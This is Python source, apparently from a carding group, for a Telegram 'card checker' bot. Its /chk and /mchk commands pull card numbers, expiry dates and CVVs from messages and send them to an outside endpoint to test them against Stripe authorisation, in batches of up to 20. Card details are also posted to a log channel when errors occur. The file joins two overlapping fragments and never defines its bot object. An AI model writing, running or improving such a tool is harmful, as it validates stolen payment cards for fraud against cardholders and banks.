import os, re, time, json, threading, requests
from telebot import TeleBot, types

# ────────── CONFIG ──────────
CHANNEL_URL      = "https://t.me/Galaxy_Carders"
GROUP_URL        = "https://t.me/+Np5evfAaxG80YThl"
LOG_CHANNEL_ID   = -1002711857436
API_BASE         = "https://phpstack-1490542-5684408.cloudwaysapps.com/st.php?cc="
PREMIUM_FILE     = "id.txt"
FREE_COOLDOWN    = 30
PREMIUM_COOLDOWN = 10
GROUPS_FILE      = "group.json"

CARD_REGEX     = re.compile(r"(\d{12,19})\D(\d{1,2})\D(\d{2,4})\D(\d{3,4})")
user_last_used = {}

# ────────── PREMIUM CHECK ──────────
def is_premium(uid: int) -> bool:
    try:
        if not os.path.isfile(PREMIUM_FILE):
            return False
        now = time.time()
        with open(PREMIUM_FILE) as f:
            for line in f:
                parts = line.strip().split(":")
                if len(parts) >= 2 and int(parts[0]) == uid and float(parts[1]) > now:
                    return True
    except: pass
    return False

# ────────── GROUP ALLOWED CHECK ──────────
def is_free_user_allowed(chat_id):
    try:
        if not os.path.exists(GROUPS_FILE):
            return False
        with open(GROUPS_FILE) as f:
            data = json.load(f)
            return chat_id in data.values()
    except: pass
    return False

# ────────── ALLOWED CHAT ──────────
def is_allowed_chat(message):
    is_pm = message.chat.type == "private"
    if is_pm:
        return is_premium(message.from_user.id)
    return is_premium(message.from_user.id) or is_free_user_allowed(message.chat.id)

# ────────── COOLDOWN ──────────
def check_cooldown(message) -> bool:
    uid = message.from_user.id
    wait = PREMIUM_COOLDOWN if is_premium(uid) else FREE_COOLDOWN
    last = user_last_used.get(uid, 0)
    now  = time.time()
    if now - last < wait:
        remaining = int(wait - (now - last))
        tier = "Premium" if is_premium(uid) else "Free"
        bot.reply_to(message, f"⏳ {tier} cooldown – wait {remaining}s.")
        return True
    user_last_used[uid] = now
    return False

# ────────── BIN INFO ──────────
def get_bin_info(bin_number):
    bin_number = bin_number[:6]
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=5)
        if r.ok:
            j = r.json()
            brand = j.get("scheme", "N/A").upper()
            type_ = j.get("type", "N/A").upper()
            level = j.get("brand", "N/A").upper()
            bank = j.get("bank", {}).get("name", "N/A").upper()
            country = j.get("country", {}).get("name", "N/A").upper()
            emoji = j.get("country", {}).get("emoji", "")
            return brand, type_, level, bank, f"{country} {emoji}"
    except: pass
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5)
        if r.ok:
            j = r.json()
            brand = j.get("brand", "N/A").upper()
            type_ = j.get("type", "N/A").upper()
            level = j.get("level", "N/A").upper()
            bank = j.get("bank", "N/A").upper()
            country = j.get("country_name", "N/A").upper()
            emoji = j.get("country_flag", "")
            return brand, type_, level, bank, f"{country} {emoji}"
    except: pass
    return "N/A", "N/A", "N/A", "N/A", "N/A"

# ────────── API CHECK ──────────
def api_check(card):
    try:
        res = requests.get(API_BASE + card, timeout=20)
        j   = res.json()
        if j.get("success"):
            return "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅", "Card Approved"
        reason = j.get("data", {}).get("error", {}).get("message", "DECLINED")
        return "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌", reason.upper()
    except Exception as e:
        try:
            bot.send_message(LOG_CHANNEL_ID, f"⚠️ <code>{card}</code>\n<pre>{e}</pre>", parse_mode="HTML")
        except: pass
        return "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌", "SOMETHING WENT WRONG"

def send_group_only_warning(msg):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Join Group", url=GROUP_URL))
    bot.reply_to(msg, "❌ Free users can use this only in group.", reply_markup=markup)

def it(t): return f"<i>{t}</i>"

# ────────── /chk ──────────
@bot.message_handler(func=lambda m: bool(re.match(r"^[!./_=:-]?chk\\b", m.text.lower())))
def chk_handler(msg):
    if not is_allowed_chat(msg):
        return send_group_only_warning(msg)
    if check_cooldown(msg): return

    src = msg.reply_to_message.text if msg.reply_to_message else msg.text
    m   = CARD_REGEX.search(src or "")
    if not m:
        return bot.reply_to(msg, "❌ Card not found.")
    card = "|".join(m.groups())

    proc = bot.reply_to(msg, '<a href="https://t.me/Galaxy_Carders">〄</a> <b><i>Processing…</i></b>', parse_mode="HTML")
    start = time.time()
    status, reason = api_check(card)
    elapsed = f"{time.time() - start:.2f} seconds"
    brand, typ, lvl, bank, country = get_bin_info(card.split("|")[0])
    user_link = f"<a href='tg://user?id={msg.from_user.id}'>{msg.from_user.first_name}</a>"
    bullet = f'<a href="{CHANNEL_URL}">〄</a>'

    result = f"""
<b>{status}</b>

[{bullet}] <b>𝗖𝗖:</b> <code>{card}</code>
[{bullet}] <b>𝗚𝗔𝗧𝗘𝗪𝗔𝗬:</b> <b><i>STRIPE AUTH 📮</i></b>
[{bullet}] <b>𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘:</b> {reason}
[{bullet}] <b>𝗕𝗥𝗔𝗡𝗗:</b> {brand}
[{bullet}] <b>𝗧𝗬𝗣𝗘:</b> {typ}
[{bullet}] <b>𝗟𝗘𝗩𝗘𝗟:</b> {lvl}
[{bullet}] <b>𝗕𝗔𝗡𝗞:</b> {bank}
[{bullet}] <b>𝗖𝗢𝗨𝗡𝗧𝗥𝗬:</b> {country}
[{bullet}] <b>𝗖𝗛𝗘𝗖𝗞 𝗕𝗬:</b> {user_link}
[{bullet}] <b>𝗕𝗢𝗧 𝗕𝗬:</b> <a href='https://t.me/Galaxy_Carder'><b><i>GALAXY CARDER</i></b></a>
[{bullet}] <b>𝗧𝗜𝗠𝗘:</b> {elapsed}
"""
    bot.edit_message_text(result, msg.chat.id, proc.message_id, parse_mode="HTML", disable_web_page_preview=True)


import time, threading, requests, re
from telebot import TeleBot


CHANNEL_URL      = "https://t.me/Galaxy_Carders"
PREMIUM_FILE     = "id.txt"
FREE_COOLDOWN    = 30
PREMIUM_COOLDOWN = 10

user_last_used = {}

# ───────────── Regex ─────────────
CARD_REGEX = re.compile(r"(\d{12,19})\D(\d{1,2})\D(\d{2,4})\D(\d{3,4})")

# ───────────── Premium Check ─────────────
def is_premium(uid: int):
    try:
        with open(PREMIUM_FILE) as f:
            now = time.time()
            for line in f:
                parts = line.strip().split(":")
                if len(parts) == 2 and int(parts[0]) == uid and float(parts[1]) > now:
                    return True
    except:
        pass
    return False

# ───────────── Cooldown Check ─────────────
def check_cooldown(msg):
    uid = msg.from_user.id
    now = time.time()
    last = user_last_used.get(uid, 0)
    limit = PREMIUM_COOLDOWN if is_premium(uid) else FREE_COOLDOWN
    if now - last < limit:
        wait = int(limit - (now - last))
        tier = "Premium" if is_premium(uid) else "Free"
        bot.reply_to(msg, f"⏳ {tier} cooldown active. Wait {wait}s.")
        return True
    user_last_used[uid] = now
    return False

# ───────────── Multi-prefix /mchk ─────────────
@bot.message_handler(func=lambda m: bool(re.match(r"^[!./_=:-]?mchk\b", m.text.lower())))
def mchk_handler(message):
    if check_cooldown(message): return

    chat_id = message.chat.id
    user = message.from_user
    user_link = f"<a href='tg://user?id={user.id}'>{user.first_name or 'User'}</a>"
    bot_credit = "<b><i>GALAXY CARDER</i></b>"
    LOG_CHANNEL_ID = -1002711857436

    text_source = message.reply_to_message.text if message.reply_to_message else message.text
    matches = CARD_REGEX.finditer(text_source or "")
    cards = ["|".join(m.groups()) for m in matches]

    if not cards:
        return bot.reply_to(message, "❌ No cards found.")
    if len(cards) > 20:
        return bot.reply_to(message, "⚠️ Max 20 cards allowed.")

    header = "<b>『 Mass Stripe Auth [ /mchk ] 』</b>\n━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━"
    sent_msg = bot.reply_to(
        message,
        f"{header}\n<b>𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ➜</b> [0 / {len(cards)}]\n\n𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝗰𝗮𝗿𝗱𝘀…",
        parse_mode="HTML"
    )

    def check_api(card):
        try:
            r = requests.get(f"https://phpstack-1490542-5684408.cloudwaysapps.com/st.php?cc={card}", timeout=20)
            j = r.json()
            if j.get("success") is True:
                return "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅", "Card Approved"
            reason = j.get("data", {}).get("error", {}).get("message", "Declined")
            return "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌", reason
        except Exception as e:
            try:
                bot.send_message(LOG_CHANNEL_ID,
                    f"⚠️ API ERROR in /mchk:\n<code>{card}</code>\n\n<pre>{str(e)}</pre>",
                    parse_mode="HTML")
            except: pass
            return "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌", "Something went wrong."

    def tag(txt): return f"<b><i>{txt}</i></b>"

    def worker():
        start_all = time.time()
        results = []

        for idx, cc in enumerate(cards, start=1):
            status, reason = check_api(cc)
            results.append(
                f"{tag('𝗖𝗖 ➜')} <code>{cc}</code>\n"
                f"{tag('𝗦𝘁𝗮𝘁𝘂𝘀 ➜')} <b>{status}</b>\n"
                f"{tag('𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜')} <i>{reason}</i>"
            )

            progress = (f"{header}\n<b>𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ➜</b> [{idx} / {len(cards)}]\n\n"
                        + "\n\n".join(results))
            try:
                bot.edit_message_text(
                    progress, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id,
                    parse_mode="HTML", disable_web_page_preview=True
                )
            except:
                pass

        total_sec = int(time.time() - start_all)
        h, rem = divmod(total_sec, 3600)
        m, s = divmod(rem, 60)

        final_text = (
            f"{header}\n<b>𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ➜</b> [{len(cards)} / {len(cards)}]\n\n" +
            "\n\n".join(results) +
            f"\n\n{tag('𝗧𝗶𝗺𝗲 ➜')}  {h}h {m}m {s}s\n"
            f"{tag('𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➜')} {user_link} [ {'𝗣𝗥𝗘𝗠𝗜𝗨𝗠' if is_premium(user.id) else '𝗙𝗥𝗘𝗘'} ]\n"
            "━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
            f"𝐁𝐨𝐭 𝐁𝐲 ➜ {bot_credit}"
        )

        try:
            bot.edit_message_text(
                final_text, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id,
                parse_mode="HTML", disable_web_page_preview=True
            )
        except:
            pass

    threading.Thread(target=worker, daemon=True).start()

